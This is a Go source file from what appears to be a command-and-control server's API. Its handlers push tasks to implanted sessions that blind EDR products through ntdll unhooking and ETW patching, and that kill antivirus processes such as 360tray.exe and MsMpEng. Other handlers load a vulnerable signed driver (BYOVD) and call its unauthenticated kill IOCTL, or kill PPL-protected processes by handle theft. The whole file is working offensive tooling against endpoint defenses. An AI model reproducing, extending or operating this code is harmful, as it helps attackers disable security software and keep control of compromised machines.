package api

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"strconv"
	"strings"

	"github.com/gorilla/mux"
	"toshell/internal/server/drivers"
	"toshell/internal/server/logging"
)

// parseIOCTLValue 解析 IOCTL：兼容 "0x222048"（十六进制字符串）、"2236488"（十进制字符串）
// 与 2236488（数字）。非法/空值返回 0。
func parseIOCTLValue(v interface{}) uint32 {
	switch t := v.(type) {
	case float64:
		return uint32(t)
	case string:
		s := strings.TrimSpace(t)
		if s == "" {
			return 0
		}
		if n, err := strconv.ParseUint(strings.TrimPrefix(strings.ToLower(s), "0x"), 16, 32); err == nil {
			return uint32(n)
		}
		if n, err := strconv.ParseUint(s, 10, 32); err == nil {
			return uint32(n)
		}
	}
	return 0
}

// rememberSessionDriver 登记"本会话已加载的驱动档案"，供 byovd_kill 复用。
func (s *Server) rememberSessionDriver(sessionID string, d drivers.Driver) {
	if sessionID == "" {
		return
	}
	s.driverMu.Lock()
	defer s.driverMu.Unlock()
	if s.sessionDrivers == nil {
		s.sessionDrivers = map[string]drivers.Driver{}
	}
	s.sessionDrivers[sessionID] = d
}

// recallSessionDriver 取回本会话登记的驱动档案。
//
// v1.4.0 S6 P0-1：内存里没有时，回落到**驱动加载台账**（drivers.Ledger，落盘、跨重启保留）。
// 为什么必须回落：服务端进程一重启，sessionDrivers 就空了，而目标机上的驱动还在 ——
// 不回落的症状是"什么都没变，却突然说没有可用驱动档案"；回落之后，重启前加载过的驱动
// 仍能按档位被选到（台账记录的是"下发过加载"，调用方按提示自行确认目标机现状即可）。
func (s *Server) recallSessionDriver(sessionID string) (drivers.Driver, bool) {
	s.driverMu.Lock()
	d, ok := s.sessionDrivers[sessionID]
	s.driverMu.Unlock()
	if ok {
		return d, true
	}
	if sessionID == "" {
		return drivers.Driver{}, false
	}
	return s.driverLedgerOf().ProfileFor(sessionID)
}

// forgetSessionDriver 清掉本会话登记的驱动档案（卸载成功后调用，避免"已卸载却还能被选到"）。
func (s *Server) forgetSessionDriver(sessionID string) {
	s.driverMu.Lock()
	defer s.driverMu.Unlock()
	delete(s.sessionDrivers, sessionID)
}

// routeRequestFor 组装既有 /edr/* 路由用的选路输入（与分级入口共用 drivers.Route 的同一份口径）。
func (s *Server) routeRequestFor(sessionID string, req drivers.RouteRequest) drivers.RouteRequest {
	if d, ok := s.recallSessionDriver(sessionID); ok {
		sess := d
		req.Session = &sess
	}
	req.LedgerServices = s.driverLedgerOf().PendingServicesForSession(sessionID)
	return req
}

// writeDriverRouteError 把选路失败按错误码回给调用方（既有路由的响应体保持 {"error": "..."} 形状，
// 额外多一个机器可读的 code —— 既有的前端/脚本读 error 字段仍然照旧）。
func writeDriverRouteError(w http.ResponseWriter, code string, err error) {
	status := http.StatusBadRequest
	if code != drivers.RouteCodeUnknownPurpose && code != drivers.RouteCodeMissingServiceName &&
		code != drivers.RouteCodeProfileIncomplete {
		// 环境类问题（目录里没有这一档驱动）用 409：与分级入口同一口径。
		status = http.StatusConflict
	}
	w.WriteHeader(status)
	body, _ := json.Marshal(map[string]interface{}{
		"error": err.Error(),
		"code":  code,
	})
	w.Write(body)
}

// errCodeOfRoute 取 RouteError 的机器可读码（不是 RouteError 时给空串）。
func errCodeOfRoute(err error) string {
	var re *drivers.RouteError
	if errors.As(err, &re) {
		return re.Code
	}
	return ""
}

// edrBlindHandler 下发 EDR 失明任务（ntdll 脱钩 + ETW patch + Autologger 清理）。
func (s *Server) edrBlindHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]
	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}
	taskInfo, err := s.taskMgr.CreateEDRBlind(id)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	logging.Info("api", "edr_blind pushed to session %s", id)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "EDR blind task pushed",
	})
}

// edrKillHandler 下发 EDR 击杀任务；processes 为空时使用植入端默认杀软进程列表。
func (s *Server) edrKillHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req struct {
		Processes []string `json:"processes"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)

	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}
	taskInfo, err := s.taskMgr.CreateEDRKill(id, req.Processes)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	logging.Info("api", "edr_kill (%d procs) pushed to session %s", len(req.Processes), id)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"count":     len(req.Processes),
		"message":   "EDR kill task pushed",
	})
}

// byovdKillHandler 下发 BYOVD 驱动击杀任务：按 PID 或进程名调用**操作员提供的**
// 驱动的无鉴权进程终止 IOCTL（服务端不再内置任何驱动，因此设备名与 IOCTL 必须由
// 请求指定，或来自此前 byovd_load 时登记/驱动目录 manifest 声明的档案）。
//
// 请求体：{ "pid": 1234 } 或 { "process_name": "360tray.exe" }，
// 可选 { "device": "\\\\.\\yourdrv", "ioctl": "0x222048" } 或 { "driver": "yourdrv" }。
// 该路线对 PPL 保护进程无效（内核句柄检查拦得住），PPL 请用 ppl_kill 的句柄窃取路线。
func (s *Server) byovdKillHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req struct {
		PID         uint32      `json:"pid"`
		ProcessName string      `json:"process_name"`
		Driver      string      `json:"driver"`
		Device      string      `json:"device"`
		IOCTL       interface{} `json:"ioctl"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}
	if req.PID == 0 && req.ProcessName == "" {
		http.Error(w, `{"error":"pid 或 process_name 至少提供一个"}`, http.StatusBadRequest)
		return
	}

	// 驱动档案解析：**与分级入口共用 drivers.Route 的同一份选路口径**
	// （显式 device+ioctl → 点名档案 → 本会话登记 → 目录按档位自动挑）。
	// 这里不再自己写一套优先级：两套口径必然漂移，而漂移的症状是"预览说有驱动、下发却挑到别的"。
	sum := drivers.Summary()
	routeReq := s.routeRequestFor(id, drivers.RouteRequest{
		Action:         "byovd_kill",
		ExplicitDevice: strings.TrimSpace(req.Device),
		ExplicitIOCTL:  parseIOCTLValue(req.IOCTL),
		RequestedName:  strings.TrimSpace(req.Driver),
		// 既有语义：请求里显式给 device+ioctl 时不再核对档位（操作员手填驱动参数）。
		AllowExplicit: true,
	})
	res, rerr := drivers.Route(sum, routeReq)
	if rerr != nil {
		writeDriverRouteError(w, errCodeOfRoute(rerr), rerr)
		return
	}
	device, ioctl, driverName := res.Driver.Device, res.Driver.IOCTL, res.Driver.Name
	for _, n := range res.Notes {
		logging.Warn("api", "byovd_kill 选路提示（session=%s）：%s", id, n)
	}

	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}
	taskInfo, err := s.taskMgr.CreateBYOVDKill(id, req.PID, req.ProcessName, device, ioctl)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	target := req.ProcessName
	if target == "" {
		target = fmt.Sprintf("pid=%d", req.PID)
	}
	logging.Info("api", "byovd_kill (%s) pushed to session %s (driver=%s device=%s ioctl=0x%X)",
		target, id, driverName, device, ioctl)
	resp := map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"driver":    driverName,
		"device":    device,
		"ioctl":     ioctl,
		"message":   "BYOVD kill task pushed",
		// 选路来源与提示（v1.4.0 S6 P0-1）：例如"点名了一个没声明 purpose 的老档案"、
		// "显式 device+ioctl 跳过了档位核对" —— 不放进响应的话操作员只能去翻日志。
		"source":  res.Source,
		"purpose": res.Purpose,
	}
	if len(res.Notes) > 0 {
		resp["notes"] = res.Notes
	}
	json.NewEncoder(w).Encode(resp)
}

// byovdLoadHandler 下发 BYOVD 驱动加载任务（driver_b64 + service_name + device_name），
// 可选 kill_ioctl/purpose/description：填了就在服务端登记该驱动档案，
// 供后续 byovd_kill 直接复用（避免每次都手填设备名与 IOCTL）。
func (s *Server) byovdLoadHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]
	var req struct {
		DriverB64   string      `json:"driver_b64"`
		ServiceName string      `json:"service_name"`
		DeviceName  string      `json:"device_name"`
		KillIOCTL   interface{} `json:"kill_ioctl"`
		Name        string      `json:"name"`
		Description string      `json:"description"`
		// Purpose 可选：显式声明这个驱动是哪一档（kill/rw/both，v1.4.0 S6）。
		// 留空时用 manifest.json 的声明；两边都没有则按 kill 兜底（既有行为）。
		Purpose string `json:"purpose"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.DriverB64 == "" {
		http.Error(w, `{"error":"driver_b64 is required"}`, http.StatusBadRequest)
		return
	}
	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}

	// —— 选路：确定"以哪一档登记"与"设备名/IOCTL 用什么"（与分级入口同一份 drivers.Route）——
	// 既有行为保留：请求里没声明 purpose 时按 kill 档登记（Route 会回一条提示）。
	sum := drivers.Summary()
	routeReq := s.routeRequestFor(id, drivers.RouteRequest{
		Action:          "byovd_load",
		RequestedName:   strings.TrimSpace(req.Name),
		ServiceName:     strings.TrimSpace(req.ServiceName),
		DeviceName:      strings.TrimSpace(req.DeviceName),
		KillIOCTL:       parseIOCTLValue(req.KillIOCTL),
		DeclaredPurpose: strings.TrimSpace(req.Purpose),
	})
	routeRes, rerr := drivers.Route(sum, routeReq)
	if rerr != nil {
		writeDriverRouteError(w, errCodeOfRoute(rerr), rerr)
		return
	}
	for _, n := range routeRes.Notes {
		logging.Warn("api", "byovd_load 选路提示（session=%s）：%s", id, n)
	}

	// —— 加载前自检（ROADMAP P0-1）——
	// 有 Errors（典型场景：上传的 .sys 与 manifest 声明的 sha256 不一致，说明被替换/损坏）→ 拒绝下发；
	// 有 Warnings（未签名、本机易受攻击驱动黑名单可能拦截等）→ 允许下发，但回传警告并记日志。
	// 说明：WinVerifyTrust 只能校验磁盘文件，因此上传内容靠 manifest 的期望 sha256 做硬校验，
	// 签名结论则在服务端存在同名同哈希驱动时复用（详见 drivers.VerifyBytes 注释）。
	var verify *drivers.VerifyResult
	var blobLen int64
	if raw, decErr := base64.StdEncoding.DecodeString(strings.TrimSpace(req.DriverB64)); decErr != nil {
		logging.Warn("api", "byovd_load 自检跳过：driver_b64 解码失败（%v）", decErr)
	} else {
		blobLen = int64(len(raw))
		res := drivers.VerifyBytes(req.Name, raw)
		verify = &res
	}
	if verify != nil && len(verify.Errors) > 0 {
		logging.Warn("api", "byovd_load 自检未通过，拒绝下发（driver=%q）：%s", req.Name, strings.Join(verify.Errors, "；"))
		body, _ := json.Marshal(map[string]interface{}{
			"error":    "驱动自检未通过，已拒绝下发：" + strings.Join(verify.Errors, "；"),
			"verify":   verify,
			"warnings": verify.Warnings,
		})
		w.WriteHeader(http.StatusBadRequest)
		w.Write(body)
		return
	}
	if verify != nil && len(verify.Warnings) > 0 {
		logging.Warn("api", "byovd_load 自检警告（driver=%q）：%s", req.Name, strings.Join(verify.Warnings, "；"))
	}

	// 登记驱动档案（设备名统一补上 \\.\ 前缀的工作已由 Route 完成），
	// 档位取自选路结论（manifest 声明 → 请求声明 → 兜底 kill）：**不再硬编码 kill**，
	// 否则一个 rw 档驱动加载完也永远选不进 ppl_kill 的 rw 档。
	dev := routeRes.Driver.Device
	ioctl := routeRes.Driver.IOCTL
	svc := routeRes.Driver.Service
	if svc == "" {
		svc = strings.TrimSpace(req.ServiceName)
	}
	if ioctl != 0 || dev != "" || svc != "" {
		s.rememberSessionDriver(id, drivers.Driver{
			Name: firstNonEmptyStr(firstNonEmptyStr(routeRes.Driver.Name, svc), req.Name), Service: svc, Device: dev,
			IOCTL: ioctl, KillPIDSize: 4, Description: req.Description, Purpose: routeRes.Purpose,
		})
		logging.Info("api", "登记驱动档案 for session %s: device=%s ioctl=0x%X purpose=%s", id, dev, ioctl, routeRes.Purpose)
	}

	taskInfo, err := s.taskMgr.CreateBYOVDLoad(id, req.DriverB64, req.ServiceName, req.DeviceName)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	// 台账：记下"服务端创建过这次加载任务"，服务端重启后的清场指引由它支撑。
	// 刻意记在 PushTask **之前**：推送失败时任务仍在队列里、心跳取走后照样会执行，
	// 只记推送成功会漏掉这类残留（漏一条残留 = 目标机留着一个没人记得清的驱动服务）。
	var taskWarns []string
	if recErr := s.driverLedgerOf().RecordLoad(drivers.LedgerEntry{
		SessionID: id, ServiceName: svc, DriverName: firstNonEmptyStr(routeRes.Driver.Name, req.Name),
		Device: dev, IOCTL: ioctl, Purpose: routeRes.Purpose,
		SHA256: hashOfVerify(verify), Size: blobLen, Source: "legacy", LoadTaskID: taskInfo.ID,
	}); recErr != nil {
		logging.Warn("api", "驱动加载台账写入失败（service=%s task=%d）：%v", svc, taskInfo.ID, recErr)
		taskWarns = append(taskWarns, "驱动加载台账写入失败："+recErr.Error()+"（服务端重启后该驱动的清场指引会缺失）")
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s","task_id":%d,"note":"该次加载已记入驱动台账（GET /api/v1/drivers/ledger）：推送失败但任务仍在队列里，心跳取走后会在目标机上执行"}`,
			err.Error(), taskInfo.ID), http.StatusInternalServerError)
		return
	}

	resp := map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "BYOVD load task pushed",
		"driver":    avopsDriverViewForLegacy(routeRes),
	}
	if len(taskWarns) > 0 {
		resp["warnings"] = taskWarns
	}
	if len(routeRes.Notes) > 0 {
		resp["notes"] = routeRes.Notes
	}
	if verify != nil {
		resp["verify"] = verify
		resp["selfcheck"] = verify.Summary()
		if len(verify.Warnings) > 0 {
			resp["warnings"] = append(toStrings(resp["warnings"]), verify.Warnings...)
		}
	}
	json.NewEncoder(w).Encode(resp)
}

// hashOfVerify 取自检结论里的 sha256（verify 可能为 nil，例如 base64 解不开）。
func hashOfVerify(v *drivers.VerifyResult) string {
	if v == nil {
		return ""
	}
	return v.SHA256
}

// toStrings 把 interface{} 里的字符串切片取出来（用于把多处警告合并成一个数组）。
func toStrings(v interface{}) []string {
	if s, ok := v.([]string); ok {
		return s
	}
	return nil
}

// avopsDriverViewForLegacy 既有路由的 driver 回显（与分级入口同一批字段，便于脚本统一解析）。
func avopsDriverViewForLegacy(res drivers.RouteResult) map[string]interface{} {
	return map[string]interface{}{
		"source":  res.Source,
		"name":    res.Driver.Name,
		"service": res.Driver.Service,
		"device":  res.Driver.Device,
		"ioctl":   res.Driver.IOCTL,
		"purpose": res.Purpose,
		"detail":  res.Detail,
	}
}

// byovdUnloadHandler 下发 BYOVD 驱动卸载任务。
//
// v1.4.0 S6 P0-1：service_name 不再必须由请求给出 —— 选路会依次尝试
// 请求 → 本会话登记的驱动档案 → 服务端加载台账（drivers.Ledger）。
// 为什么：清场恰恰发生在"会话已经换了一个、服务端也重启过"的场景，
// 那时操作员手上未必记得服务名，而服务端台账里有记录。
func (s *Server) byovdUnloadHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]
	var req struct {
		ServiceName string `json:"service_name"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)
	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}

	sum := drivers.Summary()
	routeReq := s.routeRequestFor(id, drivers.RouteRequest{
		Action:      "byovd_unload",
		ServiceName: strings.TrimSpace(req.ServiceName),
	})
	routeRes, rerr := drivers.Route(sum, routeReq)
	if rerr != nil {
		writeDriverRouteError(w, errCodeOfRoute(rerr), rerr)
		return
	}
	svc := routeRes.Driver.Service
	taskInfo, err := s.taskMgr.CreateBYOVDUnload(id, svc)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	// 台账销账：这条残留已经被显式清场（**只表示"服务端创建过卸载任务"**，不代表目标机卸载成功）。
	// 与加载同理记在推送之前：任务已创建，推送失败也仍会被心跳取走执行。
	var warns []string
	if recErr := s.driverLedgerOf().RecordUnload(id, svc, taskInfo.ID); recErr != nil {
		logging.Warn("api", "驱动卸载台账写入失败（service=%s task=%d）：%v", svc, taskInfo.ID, recErr)
		warns = append(warns, "驱动卸载台账写入失败："+recErr.Error())
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s","task_id":%d,"service":%s,"note":"该次卸载已记入驱动台账（GET /api/v1/drivers/ledger）"}`,
			err.Error(), taskInfo.ID, strconv.Quote(svc)), http.StatusInternalServerError)
		return
	}
	if d, ok := s.recallSessionDriver(id); ok && strings.EqualFold(strings.TrimSpace(d.Service), svc) {
		s.forgetSessionDriver(id)
	}
	resp := map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"service":   svc,
		"source":    routeRes.Source,
		"message":   "BYOVD unload task pushed",
	}
	if len(routeRes.Notes) > 0 {
		resp["notes"] = routeRes.Notes
	}
	if len(warns) > 0 {
		resp["warnings"] = warns
	}
	json.NewEncoder(w).Encode(resp)
}

// pplKillHandler 下发 PPL 击杀任务。
//
// 与分级入口的差异是**刻意保留**的：既有路由仍走句柄窃取路线（植入端 handlePPLKill
// 不依赖任何驱动），所以这里**不因为"没有 rw 档驱动"而拒绝** —— 拒绝会把既有的
// "普通自保护进程用句柄窃取也能杀掉"这条路径堵死（ROADMAP 明确要求保留）。
// 但选路结论（有没有 rw 档、挑中哪个）必须回显出来：操作员要能看见"这次没有 rw 档，
// 对 MsMpEng 这类 PPL 进程大概率失败，请改用分级入口等另一条路"。
func (s *Server) pplKillHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]
	var req struct {
		Processes []string `json:"processes"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)
	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}
	taskInfo, err := s.taskMgr.CreatePPLKill(id, req.Processes)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	resp := map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "PPL kill task pushed",
	}
	// 选路只用于**回显**（失败不阻断下发，见上面的注释）。
	routeRes, rerr := drivers.Route(drivers.Summary(), s.routeRequestFor(id, drivers.RouteRequest{Action: "ppl_kill"}))
	if rerr != nil {
		resp["driver"] = map[string]interface{}{
			"source": "none", "rw_available": false,
			"warning": "无可用 rw 档驱动：" + rerr.Error(),
			"note": "本次仍按既有句柄窃取路线下发（植入端 handlePPLKill 不依赖驱动）：" +
				"对普通自保护进程可能成功，对 PPL 保护进程（MsMpEng 等）通常失败；" +
				"要点按钮前就被明确拦住，请走分级入口 POST /api/v1/sessions/{id}/av-ops（它要求 rw 档驱动）",
		}
	} else {
		resp["driver"] = avopsDriverViewForLegacy(routeRes)
	}
	json.NewEncoder(w).Encode(resp)
}
